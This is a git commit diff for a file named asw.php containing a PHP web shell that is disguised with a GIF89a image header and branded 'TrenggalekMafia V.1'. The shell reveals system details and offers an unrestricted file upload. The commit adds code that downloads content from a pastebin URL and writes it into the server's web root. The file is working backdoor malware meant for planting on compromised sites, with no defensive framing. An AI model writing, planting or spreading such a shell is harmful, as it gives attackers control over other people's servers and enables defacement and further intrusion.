35c658c6b4e1f6f856ebc2f6d571c2487e2e12f3
kampungtengah <57802669+kampungtengah@users.noreply.github.com>
2019-11-25 04:18:18 +0700

    Update asw.php

--- asw.php
+++ asw.php
@@ -1,1 +1,20 @@
-GIF89a <?php echo 'TrenggalekMafia V.1'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
+GIF89a 
+<?php echo 'TrenggalekMafia V.1'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
+<?php
+function http_get($url){
+$im = curl_init($url);
+curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($im, CURLOPT_HEADER, 0);
+return curl_exec($im);
+curl_close($im);
+}
+$check1 = $_SERVER['DOCUMENT_ROOT'] . "/pulang.txt" ;
+$text1 = http_get('https://pastebin.com/raw/0cJWy47S');
+$open1 = fopen($check1, 'w');
+fwrite($open1, $text1);
+fclose($open1);
+if(file_exists($check1)){
+}
+?>
